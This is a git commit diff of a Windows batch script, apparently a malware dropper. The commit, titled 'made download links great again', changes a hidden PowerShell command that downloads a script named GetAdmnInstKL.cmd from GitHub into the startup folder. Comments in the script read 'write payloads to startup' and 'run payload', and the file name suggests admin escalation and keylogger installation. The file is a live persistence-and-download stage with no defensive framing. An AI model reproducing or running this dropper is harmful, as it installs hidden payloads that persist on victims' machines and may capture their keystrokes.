6f4cccaf2cd09dcb7b08ce05bc21e063c510c400
jfrdgh <162196506+jfrdgh@users.noreply.github.com>
2024-03-10 02:02:39 +0000

    made download links great again

--- initial.cmd
+++ initial.cmd
@@ -10,7 +10,7 @@ cd %STARTUP%
 @REM TODO: build out stage two
 
 @REM write payloads to startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention/main/GetAdmnInstKL.cmd -OutFile GetAdmnInstKL.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/GetAdmnInstKL.cmd -OutFile GetAdmnInstKL.cmd"
 
 
 @REM run payload
